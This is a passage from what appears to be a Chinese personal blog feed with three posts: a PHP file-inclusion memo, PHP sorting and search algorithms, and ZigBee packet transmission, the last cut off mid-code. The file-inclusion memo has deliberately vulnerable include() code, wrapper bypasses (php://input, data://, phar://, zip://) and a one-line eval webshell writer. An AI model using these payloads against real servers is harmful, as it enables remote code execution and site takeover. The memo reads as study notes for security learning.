class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>无限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/3JFCQBYj7E8gfok.png" alt="image-20200315210218269"></p><p>有限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>];<span class="keyword">include</span>($a.<span class="string">".html"</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在末尾加上<code>%3f</code>，<code>%23</code>绕过</p><p><img src="https://i.loli.net/2020/03/27/e76bKhkrUN4FY1V.png" alt="image-20200315210124764"></p><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>当<code>enctype=”multipart/form-data”</code>时<code>php://input</code>无效</p><p>用法<code>?file=php://input</code>，利用POST传入</p><p>利用php://input写马（亦可命令执行）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要求：同时开启 <code>allow_url_fopen</code> 和 <code>allow_url_include</code>（PHP &lt; 5.3.0）即可造成任意代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/792sGYLUAp4eKO6.png" alt="image-20200315212029230"></p><h4 id="file-伪协议"><a href="#file-伪协议" class="headerlink" title="file://伪协议"></a>file://伪协议</h4><p>访问本地文件系统</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/tpWhrvYjBQD8AHb.png" alt="image-20200315212627490"></p><p>注：这里的文件路径需要本地文件的绝对路径</p><h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h4><p>用法：<code>data://text/plain;base64,</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); ===base64===&gt;  PD9waHAgcGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/k1f7Nm3VCJWSOxr.png" alt="image-20200315213202734"></p><p>读取文件内容操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> show_source(<span class="string">'1.php'</span>); ===base64===&gt;   PD9waHAgc2hvd19zb3VyY2UoJzEucGhwJyk7</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/7JbDWXjd1MB58pR.png" alt="image-20200315214340393"></p><h4 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h4><p>用法：<code>?a=phar://压缩包/内部文件 phar://xxx.png/shell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 </p><p>步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p><p><img src="https://i.loli.net/2020/03/27/WDsXC64FZUiLGHp.png" alt="image-20200315215247124"></p><p>亦可写马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/27/CZrvRqPhaQlpSNs.png" alt="image-20200315215651827"></p><h4 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>php代码：</span><br><span class="line"><span class="meta">&lt;?php</span> $a = $_GET[<span class="string">'a'</span>]; <span class="keyword">include</span>($a);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</code></p><p>条件： PHP &gt; =5.3.0， #在浏览器中要编码为%23</p><p><img src="https://i.loli.net/2020/03/27/XTxLt28Pk6qFr9M.png" alt="image-20200315220043657"></p><p>亦可与上面的一样就行写马操作</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些排序和查找算法</title>
      <link href="/2020/03/02/%E4%B8%80%E4%BA%9B%E6%8E%92%E5%BA%8F%E5%92%8C%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/"/>
      <url>/2020/03/02/%E4%B8%80%E4%BA%9B%E6%8E%92%E5%BA%8F%E5%92%8C%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>最近在看PHP的时候温习了一下原来学过的排序算法（忘的都差不多了-_-），故在此记录一下</p><h4 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印数列</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="number">1</span>,<span class="number">2</span> =&gt; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = count($arr); $i &lt; <span class="number">15</span>; $i++)&#123;</span><br><span class="line">    $arr[$i + <span class="number">1</span>] = $arr[$i] + $arr[$i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">print_r($arr);<span class="comment">//打印数列前15位</span></span><br><span class="line"><span class="comment">//下面计算数列的第几位</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($n ==<span class="number">1</span> || $n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a($n - <span class="number">1</span>) + a($n <span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> a(<span class="number">15</span>);<span class="comment">//打印数列第15位</span></span><br></pre></td></tr></table></figure><h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line">$len = count($arr);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $len - $i <span class="number">-1</span>;$j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($arr[$j] &gt; $arr[$j+<span class="number">1</span>])&#123;</span><br><span class="line">            $temp = $arr[$j];</span><br><span class="line">            $arr[$j] = $arr[$j+<span class="number">1</span>];</span><br><span class="line">            $arr[$j+<span class="number">1</span>] = $temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($arr);</span><br></pre></td></tr></table></figure><h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line">$len = count($arr);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt;$len ;$i++)&#123;</span><br><span class="line">    $min = $i;</span><br><span class="line">    <span class="keyword">for</span> ($j = $i + <span class="number">1</span>;$j &lt; $len;$j++)&#123; <span class="comment">//这个for循环选出最小值</span></span><br><span class="line">        <span class="keyword">if</span>($arr[$j]&lt; $arr[$min])&#123;</span><br><span class="line">            $min = $j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($min != $i)&#123;  <span class="comment">//选择最小值放前面</span></span><br><span class="line">        $temp = $arr[$i];</span><br><span class="line">        $arr[$i] = $arr[$min];</span><br><span class="line">        $arr[$min] = $temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($arr);</span><br></pre></td></tr></table></figure><h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line">$len = count($arr);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">    $temp = $arr[$i];    <span class="comment">//从第二个数据开始依次取出数据与前面已经排好的进行比较</span></span><br><span class="line">    $flag = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span>($j = $i - <span class="number">1</span>; $j &gt;= <span class="number">0</span>;$j--)&#123;</span><br><span class="line">        <span class="keyword">if</span>($arr[$j] &gt; $temp)&#123;</span><br><span class="line">            $arr[$j + <span class="number">1</span>] = $arr[$j];</span><br><span class="line">            <span class="comment">//$arr[$j] = $temp;     //优化后略过了这一次赋值，意思就是temp元素依旧存在，没进入数组，当前面的元素都交换完成后，才在后面的if语句中进行最后的赋值操作</span></span><br><span class="line">            $flag = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">break</span>;   <span class="comment">//这里的作用是如果在判断的时候取出来的就已经比他左边的要大了，就不用进行交换了，直接break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($flag)&#123;  <span class="comment">//如果交换了，则进行temp赋值</span></span><br><span class="line">        $arr[$j + <span class="number">1</span>] = $temp; <span class="comment">//这里$j需要加一的原因是在上面的循环最后执行了一次$j--的操作，于是这里需要把1加上</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($arr);</span><br></pre></td></tr></table></figure><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quick_sort</span><span class="params">($arr)</span></span>&#123;</span><br><span class="line">    $len = count($arr);</span><br><span class="line">    <span class="keyword">if</span>($len &lt;= <span class="number">1</span>) <span class="keyword">return</span> $arr;</span><br><span class="line"></span><br><span class="line">    $left = $right = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">1</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($arr[<span class="number">0</span>] &gt; $arr[$i])&#123;</span><br><span class="line">            $left[] = $arr[$i];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $right[] = $arr[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $left = quick_sort($left);<span class="comment">//递归</span></span><br><span class="line">    $right = quick_sort($right);<span class="comment">//递归</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array_merge($left,(<span class="keyword">array</span>)$arr[<span class="number">0</span>],$right);<span class="comment">//合并数组，注意这里元素必须全是数组才能进行操作，$arr[0]为元素，所以需要强制转换成数组，或者用array($arr[0])也可以</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r(quick_sort($arr));</span><br></pre></td></tr></table></figure><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge_sort</span><span class="params">($arr)</span></span>&#123;</span><br><span class="line">    $len = count($arr);</span><br><span class="line">    <span class="keyword">if</span>($len &lt;= <span class="number">1</span>) <span class="keyword">return</span> $arr;</span><br><span class="line">    $a  = floor($len / <span class="number">2</span>);<span class="comment">//舍去法取整</span></span><br><span class="line">    $left = array_slice($arr,<span class="number">0</span>,$a);<span class="comment">//array_slice从数组中取出一段序列</span></span><br><span class="line">    $right = array_slice($arr,$a);</span><br><span class="line">    $left = merge_sort($left);<span class="comment">//递归</span></span><br><span class="line">    $right = merge_sort($right);<span class="comment">//递归</span></span><br><span class="line">    $m = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">while</span>(count($left) &amp;&amp; count($right)) &#123;<span class="comment">//当有一边为0则结束返回</span></span><br><span class="line">        $m[] = $left[<span class="number">0</span>] &lt; $right[<span class="number">0</span>] ? array_shift($left) : array_shift($right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array_merge($m,$left,$right);<span class="comment">//后两个数组的放置对结果没影响</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r(merge_sort($arr));</span><br></pre></td></tr></table></figure><h3 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h3><p>这里有一种数组遍历查找就没写了</p><h4 id="二分法查找"><a href="#二分法查找" class="headerlink" title="二分法查找"></a>二分法查找</h4><p>注：二分法查找前要求数列是已经排好序了的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($arr,$num)</span></span>&#123;</span><br><span class="line">    $left = <span class="number">0</span>;</span><br><span class="line">    $right = count($arr);</span><br><span class="line">    <span class="keyword">while</span>($left &lt;= $right)&#123;</span><br><span class="line">        $middle = floor(($left + $right) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>($arr[$middle] == $num)&#123;</span><br><span class="line">            <span class="keyword">return</span> $arr[$middle];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($arr[$middle] &gt; $num)&#123;</span><br><span class="line">            $right = $middle - <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $left = $middle + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">print_r(check($arr,<span class="number">11</span>));</span><br></pre></td></tr></table></figure><p>这个方法在查找的时候如果要查的数据不在数组里就会报下面的注意事项（在的话不会报错），返回的结果<code>false</code>还是有的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Notice:  Undefined offset: 9 in C:\xxx\test.php on line 7</span><br><span class="line">Notice:  Undefined offset: 9 in C:\xxx\test.php on line 10</span><br></pre></td></tr></table></figure><p>原因还没找到，如果有大佬知道的话欢迎留言指出，wtcl -_-，没有的话坑先留着后面再填</p><h4 id="二分归并法查找"><a href="#二分归并法查找" class="headerlink" title="二分归并法查找"></a>二分归并法查找</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($arr,$num)</span></span>&#123;</span><br><span class="line">    $len = count($arr);</span><br><span class="line">    $a = floor($len / <span class="number">2</span>);</span><br><span class="line">    $left = array_slice($arr,<span class="number">0</span>,$a);</span><br><span class="line">    $right = array_slice($arr,$a);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(count($left) &amp;&amp; count($right))&#123;</span><br><span class="line">        <span class="keyword">if</span>($arr[$a] === $num )&#123;</span><br><span class="line">            <span class="keyword">return</span> $arr[$a];</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($arr[$a] &gt; $num)&#123;</span><br><span class="line">            <span class="keyword">return</span> check($left,$num);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> check($right,$num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">print_r(check($arr,<span class="number">8</span>));</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZigBee无线通信数据传输</title>
      <link href="/2020/02/11/ZigBee%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/"/>
      <url>/2020/02/11/ZigBee%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Zigbee无线通信，需要高频的载波来提供发射效率，Zigbee模块之间要可以正常的收发，接收模块必须把接收频率设置和发射模块的载波频率一致。</p></li><li><p>Zigbee有27个载波可以进行通信，载波叫做信道（无线通信的通道）。这些载波的频率落在某些频率区段，我们把这些区段叫做频段。TI的所有支持Zigbee底层协议的芯片只能在2.4G频段的16个信道里进行通信。即：</p><blockquote><p>11  2405M</p><p>12  2410M</p><p>……</p><p>26  2480M</p></blockquote></li><li><p>在Zigbee无线局域网里，每一模块都一个在该网络里唯一的2个字节的地址，这个地址叫做网络地址，网络短地址。</p></li><li><p>PANID这是一个2个字节的编码，用来区别不同的Zigbee无线局域网，个域网ID.</p></li><li><p>无线数据包的内容</p><blockquote><p>#define SENDVAL 5<br>char SendPacket[]={0x0C,0x61,0x88,0x00,0x07,0x20,0xEF,0xBE,0x20,0x50,SENDVAL};<br>//第一个字节0x0C含义，这个自己后面还有12个字节要发送<br>//第5 6个字节表示的是PANID<br>//第7 8个字节是无线模块目标设备的网络地址 0xBEEF<br>//第9 10就是本地模块的网络地址<br>//11 个字节是我们有用的数据<br>// CRC码 12 13个字节 是硬件自动追加</p></blockquote></li></ol><p>实验代码：</p><p>按钮控制数码管的数字显示变化</p><p>发送：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ioCC2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SENDVAL 5</span></span><br><span class="line"><span class="keyword">char</span> SendPacket[]=&#123;<span class="number">0x0c</span>,<span class="number">0x61</span>,<span class="number">0x88</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x20</span>,<span class="number">0xEF</span>,<span class="number">0xBE</span>,<span class="number">0x20</span>,<span class="number">0x50</span>,SENDVAL&#125;;</span><br><span class="line"><span 